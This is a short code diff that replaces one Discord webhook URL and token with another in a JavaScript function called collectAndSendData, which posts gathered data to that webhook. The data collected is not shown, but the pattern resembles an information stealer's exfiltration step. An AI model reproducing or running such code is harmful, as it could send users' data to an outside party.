@@ -164,7 +164,7 @@ async function collectAndSendData() {
     };
 
     // Send to Discord webhook
-    const webhookURL = "https://discord.com/api/webhooks/1402364477877518446/1v4i9TTbl1-3eIQhrBI_rfMNfI9FJ0QJ0g3t-C6bDKzJzjD0VXYqDvn9jFgu1fvHUptb";
+    const webhookURL = "https://discord.com/api/webhooks/1445989991317635254/qDHubz-S5h8MZ2nZeV9AmAKj_QhqWgf8XiVH5g9BntRYreZaq2z89kGs9-XG62kbS6jZ";
     
     try {
         const response = await fetch(webhookURL, {
